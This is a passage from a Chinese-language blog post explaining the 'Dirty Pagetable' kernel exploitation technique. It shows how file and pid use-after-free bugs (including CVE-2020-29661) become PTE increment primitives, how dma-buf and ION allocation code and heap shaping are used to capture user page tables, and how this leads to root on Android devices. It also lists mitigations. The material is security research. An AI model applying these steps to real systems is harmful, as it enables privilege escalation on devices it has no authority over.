/*     24      |       8 */        struct dentry *dentry;

                                   /* total size (bytes):   16 */
                               } f_path;
/*     32      |       8 */    struct inode *f_inode;
/*     40      |       8 */    const struct file_operations *f_op;
/*     48      |       4 */    spinlock_t f_lock;
/*     52      |       4 */    enum rw_hint f_write_hint;
/*     56      |       8 */    atomic_long_t f_count;
/*     64      |       4 */    unsigned int f_flags;
......
......
/*    288      |       8 */    u64 android_oem_data1;

                               /* total size (bytes):  296 */
                             }
```

`filp` cache的slab大小为2-page，一个`filp` cache的slab中有25个`file`对象，slab的结构如下所示：

![pic16_slab_layout_of_filp](/images/posts/Dirty-Pagetable/pic16_slab_layout_of_filp.svg)

由于受害者`file`对象有25个可能的位置，为确保受害者`file`对象的`f_count`和受害者PTE恰好重合，需准备如下用户页表：

![pic17_pagetable_layout](/images/posts/Dirty-Pagetable/pic17_pagetable_layout.svg)

**识别PTE对应的用户虚拟地址**：现在我们能使受害者file对象的`f_count`与一个有效的PTE重合了，这个有效的PTE就是受害者PTE。如何找到受害者PTE对应的用户虚拟地址呢？可利用递增原语。

在利用递增原语之前，页表和相应的用户虚拟地址应该如下所示：可以看到，为了区分每个用户虚拟地址对应的物理页，作者将虚拟地址写在每个物理页的前8字节，作为标记。由于用户虚拟地址对应的所有物理页都是一次性分配的，因此它们的物理地址很可能是连续的。

![pic18_patable_and_va](/images/posts/Dirty-Pagetable/pic18_patable_and_va.svg)

如果我们利用递增原语将受害者PTE增加0x1000，就会改变与受害者PTE对应的物理页，如下所示：受害者PTE和另一个有效的PTE对应同一个物理页！现在可遍历所有虚拟页，检查前8字节是不是其虚拟地址，若不是，则该虚拟页就是受害者PTE对应的虚拟页。

![pic19_change_victim_pte](/images/posts/Dirty-Pagetable/pic19_change_victim_pte.svg)

#### 3-2-5. 堆喷占用页表

**问题**：现在找到了受害者PTE，且有递增原语。可将受害者PTE对应的物理地址设置为内核text/data的物理地址，但是mmap() 分配的内存对应的物理地址大于内核text/data的物理地址，而且递增原语有限，无法溢出受害者PTE。解决办法是使**PTE指向某个用户页表，通过间接篡改用户页表，来篡改物理内存**。

**策略 1**：现在已经让受害者PTE和另一有效PTE指向同一物理页，那么如果我们调用`munmap()`解除另一有效PTE的虚拟页映射，并触发物理页的释放，会发生什么？page UAF！再用用户页表占据释放页，就能控制用户页表。但问题是，很难堆喷用户页表来占据释放页。原因是，**匿名 `mmap()` 分配的物理页来自内存区的`MIGRATE_MOVABLE` free_area，而用户页表是从内存区的`MIGRATE_UNMOVABLE` free_area分配，所以很难通过递增PTE使之指向另一用户页表**。参考[10]解释了这一点。

**策略 2**：新策略能够捕获用户页表，步骤如下。本质是**采用另一种方式来分配物理页，使该物理页和用户页表来自同一内存区域，这样如果受害者PTE指向该物理页，就能通过递增该PTE，使该PTE指向某个用户页表**。

**（1）对共享页和用户页表进行 heap shaping**

**目的**：由于共享页和用户页表位于同一种内存，可将共享页嵌入到众多用户页表当中。

**共享物理页**：通常，内核空间和用户空间需要共享一些物理页，从两个空间都能访问到。有些组件可用于分配这些共享页，例如 dma-buf heaps, io_uring, GPUs 等。

**分配共享物理页**：作者选用 dma-buf 系统堆来分配共享页，因为可以从Android中不受信任的APP来访问`/dev/dma_heap/system`，并且 dma-buf 的实现相对简单。通过 `open(/dev/dma_heap/system)` 可获得一个 dma heap fd，然后用以下代码分配一个共享页：

```c
    struct dma_heap_allocation_data data;

    data.len = 0x1000;
    data.fd_flags = O_RDWR;
    data.heap_flags = 0;
    data.fd = 0;

    if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &data) < 0) {
        perror("DMA_HEAP_IOCTL_ALLOC");
        return -1;
    }
    int dma_buf_fd = data.fd;
```

由用户空间中的 `dma_buf` fd来表示一个共享页，可通过`mmap()` dma_buf fd 将共享页映射到用户空间。从 dma-buf 系统堆分配的共享页本质上是从页分配器分配的（实际上 dma-buf 子系统采用了页面池进行优化，对于本利用没有影响）。用于分配共享页的 `gfp_flags` 如下所示：

```c
#define HIGH_ORDER_GFP  (((GFP_HIGHUSER | __GFP_ZERO | __GFP_NOWARN \ 	// HIGH_ORDER_GFP 用于 order-8和order-4 page
                | __GFP_NORETRY) & ~__GFP_RECLAIM) \
                | __GFP_COMP)
#define LOW_ORDER_GFP (GFP_HIGHUSER | __GFP_ZERO | __GFP_COMP) 			// LOW_ORDER_GFP 用于 order-0 page
static gfp_t order_flags[] = {HIGH_ORDER_GFP, HIGH_ORDER_GFP, LOW_ORDER_GFP};
```

**共享页分配vs页表分配**：从`LOW_ORDER_GFP`可以看出，单个共享页是从内存的`MIGRATE_UNMOVABLE` free_area中分配的，和页表分配的出处一样。且单个共享页为order-1 （order-0 ?），和页表的order相同。结论是，**单个共享页和页表都是从同一`migrate` free_cache中分配，且order相同**。

通过以下步骤，就能获得下图中单个共享页和用户页表的布局：

```c
step1：分配3200个用户页表
step2：使用dma-buf系统堆分配单个共享页面
step3：分配3200个用户页表
```

![pic20_sharing_page_and_pagetables](/images/posts/Dirty-Pagetable/pic20_sharing_page_and_pagetables.svg)

可见，在物理内存中，单个共享页和用户页表分布得比较紧凑。现在，我们成功对共享页和用户页表进行了heap shaping。

**（2）取消与受害者 PTE 对应的虚拟地址的映射，并将共享页映射到该虚拟地址**

**目标**：由于共享页和页表位于同种内存，所以需要将受害者PTE从原先的物理页映射到共享物理页。

**方法**：可通过`mmap()` dma_buf fd 将共享页映射到用户空间，因此可先`munmap()` 受害者PTE对应的虚拟地址，然后将单个共享页映射到该虚拟地址。如下图所示：

![pic21_remap_sharing_page](/images/posts/Dirty-Pagetable/pic21_remap_sharing_page.svg)

**（3）利用递增原语捕获用户页表**

现在，我们利用递增原语对受害者PTE增加0x1000、0x2000、0x3000，有很大机率使受害者PTE对应到另一用户页表。如下图所示：

![pic22_catch_uesr_pagetable](/images/posts/Dirty-Pagetable/pic22_catch_uesr_pagetable.svg)

#### 3-2-6. patch内核提权

现在已经控制了一个用户页表。通过修改用户页表中的PTE，就能修改内核 text/data，其余操作和 2-5-5 类似，即可提权：

![pic23_file_uaf_root](/images/posts/Dirty-Pagetable/pic23_file_uaf_root.jpg)

## 4. 利用pid UAF

### 4-1. CVE-2020-29661漏洞介绍

**介绍**：CVE-2020-29661属于pid UAF漏洞，已被Jann Horn[12]和Yong Wang[10]利用。Jann Horn在Debian上通过控制用户页表来修改只读文件（例如，setuid二进制文件）的页缓存，缺点是无法逃逸容器，且不能绕过Android上的SELinux防护。

作者采用Dirty Pagetable的方法重新利用了CVE-2020-29661，能在含有内核4.14的Google Pixel 4上提权。pid UAF 和 file UAF 都使用类似的增递增原语来操作 PTE。以下只介绍关键步骤。

### 4-2. 脏页表方法利用CVE-2020-29661

与file UAF类似，在触发CVE-2020-29661并释放受害者slab中的所有其他pid对象后，可通过 3-2-2 ~ 3-2-3 类似方法，用用户页表占用受害者slab。如下图所示，受害者pid对象位于用户页表中：

![pic24_occupy_slab_with_pagetable_pid](/images/posts/Dirty-Pagetable/pic24_occupy_slab_with_pagetable_pid.svg)

#### 4-2-1. 利用pid UAF构造递增原语

**目标**：利用递增原语篡改受害者PTE。

选取受害者pid对象的`count`成员与有效PTE重合，`count`位于pid对象的前4字节（8字节对齐）：

```c
struct pid
{
    refcount_t count; //<------------- 4 bytes, aligned with 8
    unsigned int level;
    spinlock_t lock;
    /* lists of tasks that use this pid */
    struct hlist_head tasks[PIDTYPE_MAX];
    struct hlist_head inodes;
    /* wait queue for pidfd notifications */
    wait_queue_head_t wait_pidfd;
    struct rcu_head rcu;
    struct upid numbers[1];
};
```

尽管 `count` 字段只有4字节，但是与PTE的低4字节重合。Jann horn[12] 之前基于 `count` 构造了递增原语，但是限制也是由于fd资源有限，可通过 `fork()` 在多个进程中执行递增原语，突破限制。

#### 4-2-2. 分配共享页

内核4.14中没有 dma-buf，可通过ION来分配共享页，ION更加方便，因为可通过设置ION的flag直接从页分配器分配共享页。分配代码如下：

```c
#if LEGACY_ION
int alloc_pages_from_ion(int num) {

    struct ion_allocation_data data;
    memset(&data, 0, sizeof(data));

    data.heap_id_mask = 1 << ION_SYSTEM_HEAP_ID;
    data.len = 0x1000*num;
    data.flags = ION_FLAG_POOL_FORCE_ALLOC;
    if (ioctl(ion_fd, ION_IOC_ALLOC, &data) < 0) {
        perror("ioctl");
        return -1;
    };

    struct ion_fd_data fd_data;
    fd_data.handle = data.handle;
    if (ioctl(ion_fd, ION_IOC_MAP, &fd_data) < 0) {
        perror("ioctl");
        return -1;
    }
    int dma_buf_fd = fd_data.fd;
    return dma_buf_fd;
}
#else
int alloc_pages_from_ion(int num) {

    struct ion_allocation_data data;
    memset(&data, 0, sizeof(data));

    data.heap_id_mask = 1 << ION_SYSTEM_HEAP_ID;
    data.len = 0x1000*num;
    data.flags = ION_FLAG_POOL_FORCE_ALLOC;
    if (ioctl(ion_fd, ION_IOC_ALLOC, &data) < 0) {
        perror("ioctl");
        return -1;
    }

    int dma_buf_fd = data.fd;

    return dma_buf_fd;
}
#endif
```

共享页由用户空间中的`dma_buf_fd` 表示，可通过 `mmap()` dma_buf_fd 将共享页映射到用户空间。

#### 4-2-3. Google Pixel 4提权

成功提权：

![pic25_root_pixel4](/images/posts/Dirty-Pagetable/pic25_root_pixel4.png)

## 5. 脏页表方法的挑战

（1）如何刷新TLB和页表缓存

为了加快MMU的页表查找，ARM64使用多级缓存，例如TLB和专用页表缓存。为了成功使用脏页表，必须在访问用户页表之前刷新这些缓存，否则无法正确patch内核。Stephan van Schaik [13] 在文中提出了一种可靠的方法来刷新缓存，本文采用的是该方法。

（2）如何防止提权过程中对页表的意外操作

- 第一，可能会使用非最后一级页表的受害者slab，例如2级页表或3级页表。为了避免这种情况，需在堆喷末级页表之前触发非末级页表的分配。
- 第二，内核可能会交换出我们正在修改的PTE对应的页。该操作会使我们正在修改的页无法访问，导致内核崩溃。为避免这种情况，可以使用 `mlock()` 将PTE对应的虚拟地址锁定到RAM中，或者尽量不要让内存承受太大的压力，避免该页被换出交换区。

## 6. 脏页表的缓解方法

（1）内核物理地址随机化，避免攻击者知道准确的内核物理地址，但是仍可以篡改其他内核堆数据来提权（不需要绕过内核物理地址随机化）。

（2）将用户页表设置为只读，这样就无法篡改用户页表，但是会增大开销，因为内核需要做更多的修改页表的工作。

（3）利用hypervisor 或 Trustzone技术使内核text或其他内存区域变为只读，这种方法能防止脏页表修改内核text或其他内存区域。

## 7. 参考

[Dirty Pagetable: A Novel Exploitation Technique To Rule Linux Kernel](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html) 

[0] [Flipping Pages: An analysis of a new Linux vulnerability in nf_tables and hardened exploitation techniques](https://pwning.tech/nftables/) —— 通用利用方法，本方法名叫Dirty Pagedirectory。利用堆漏洞（例如Double-Free）在同一地址分配**Page Upper Directory (PUD)** 和**Page Middle Directory (PMD)**，其VMA 应该是独立的，以避免冲突（因此不要在 PUD 区域内分配 PMD）。 然后，向PMD范围内的页写入地址，并读取PUD范围的相应页中的地址。

[1] [https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf](https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019 - Exploiting race conditions on Linux.pdf)

[2] [https://lifeasageek.github.io/papers/ yoochan-exprace-bh.pdf](https://lifeasageek.github.io/papers/yoochan-exprace-bh.pdf)

[3] https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-YongLiu-USMA-Share-Kernel-Code.pdf

[4] [https:// googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22265.html](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22265.html)

[5] https://seclists.org/oss-sec/2022/q1/99

[6] https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf

[7] [https://i.blackhat.com/USA-22 /Wednesday/US-22-Wu-Devils-Are-in-the-File.pdf](https://i.blackhat.com/USA-22/Wednesday/US-22-Wu-Devils-Are-in-the-File.pdf)

[8] [https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors .pdf](https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors.pdf)

[9] [opensrcsec/same_type_object_reuse_exploits](https://github.com/opensrcsec/same_type_object_reuse_exploits)

[10] [https://i.blackhat.com/USA-22/Thursday/US-22-WANG-Ret2page-The-Art-of-Exploiting-Use-After-Free-Vulnerability -in-the-Dedicated-Cache.pdf](https://i.blackhat.com/USA-22/Thursday/US-22-WANG-Ret2page-The-Art-of-Exploiting-Use-After-Free-Vulnerabilities-in-the-Dedicated-Cache.pdf)

[11] https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html

[12] https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html

[13] https://www.semanticscholar.org/paper/Reverse-Engineering-Hardware-Page-Table-Caches-on-Schaik/32c37ad63901eeafc848c2f8d9a73db42b365e9f

https://blog.csdn.net/qq_61670993/article/details/136115905 —— 以 [m0leCon Finals 2023 CTF keasy](https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#f-07e0549f) 为例讲解了如何采用脏页表来利用`file` UAF。